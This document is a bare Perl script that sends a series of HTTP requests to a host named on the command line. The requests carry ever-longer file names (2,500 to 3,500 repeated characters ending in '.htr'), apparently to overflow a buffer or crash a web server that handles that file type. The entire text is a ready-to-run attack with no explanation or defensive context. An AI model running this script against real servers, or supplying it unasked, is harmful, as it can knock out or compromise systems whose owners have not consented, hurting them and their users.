#!/usr/bin/perl
use LWP::Simple;
for ($i = 2500; $i <= 3500; $i++) {
warn "$i\n";
get "http://$ARGV[0]/".('a' x $i).".htr";
}
